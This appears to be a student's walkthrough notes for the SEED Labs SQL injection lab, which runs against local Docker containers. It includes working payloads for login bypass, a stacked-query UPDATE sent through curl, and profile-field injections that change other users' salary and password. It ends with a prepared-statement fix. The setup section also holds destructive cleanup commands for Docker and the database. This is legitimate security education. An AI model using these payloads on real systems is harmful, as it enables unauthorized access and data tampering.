# SETUP
edit hosts
```bash
sudo gedit /etc/hosts &>/dev/null &
```

to remove previous containers
```bash
docker rm -vf $(docker ps -a -q)
```

to remove all images
```bash
docker rmi -f $(docker images -a -q)
```

```bash
dcbuild
dcup
```
open a new tab of cmd
```bash
dockps
```

to clear database
```bash
sudo rm -rf mysql_data
```


## Open a new tab of cmd
open mysql container
```bash
docksh 36b1
```

# TASK 1

Inside the MySQL container
```bash
mysql -u root -pdees
mysql> use sqllab_users;
mysql> show tables;
# to show details
select * from credential;
```

# TASK 2
## Task 2.1
username : <b>Admin' #</b>

## Task 2.2
to login for alice:
<br>
curl 'www.seed-server.com/unsafe_home.php?username=alice&Password=seedalice'

for the task:<br>
'(single quote) == %27 <br>
space == %20<br>
\# (hash)== %23<br>
```bash
curl 'www.seed-server.com/unsafe_home.php?username=Admin%27%20%23'
```

## Task 2.3
to encode: https://www.urlencoder.org/

```bash
cd image_www/Code/

sudo gedit unsafe_home.php &>/dev/null &
```

<br>
change in unsafe_home.php and 
update query to multi_query
<br>

```bash
docker cp unsafe_home.php 8f4c94620032:/var/www/SQL_Injection/
```
<br>

update credential set name='Teed' where id=5;

```bash
curl 'www.seed-server.com/unsafe_home.php?username=alice%27%20%3B%20update%20credential%20set%20name%3D%27Teed%27%20where%20id%3D5%3B%23'
```

check the result:

```sql
select * from credential;
```

<b>to see the result in web page 
we need to change the multi_query to query again
</b>
<br>

# Task 3
unsafe_edit_backend.php

```bash
cd image_www/Code/

sudo gedit unsafe_edit_backend.php &>/dev/null &
```

copy

```bash
docker cp unsafe_edit_backend.php 8f4c94620032:/var/www/SQL_Injection/
```
## Task 3.1
to change salary ==> in Edit Profile of ALice in NickName field type==>
```
Alice', salary = 30000;#
```

## Task 3.2

to set salary=1 of Boby
```
Alice ', salary = 1 where name = 'Boby';#
```

## Task 3.3
to set password = 1234 of Boby
```
Alice ', password = sha1('1234') where name = 'Boby';#
```

# Task 4

```sql
$stmt = $conn->prepare("SELECT name, local, gender
FROM USER_TABLE
WHERE id = ? and password = ? ");
$stmt->bind_param("is", $id, $pwd);
$stmt->execute();
$stmt->bind_result($bind_name, $bind_local, $bind_gender);
$stmt->fetch();
```

write this in unsafe.php
```sql
$result = $conn->prepare("SELECT id, name, eid, salary, ssn
			FROM credential
			WHERE name = ? and Password = ? ");
$result->bind_param("ss", $input_uname, $hashed_pwd);
$result->execute();
$result->bind_result($id, $name, $eid, $salary, $ssn);
$result->fetch();
```

then copy
```bash
docker cp unsafe.php 8f4c94620032:/var/www/SQL_Injection/defense/
```






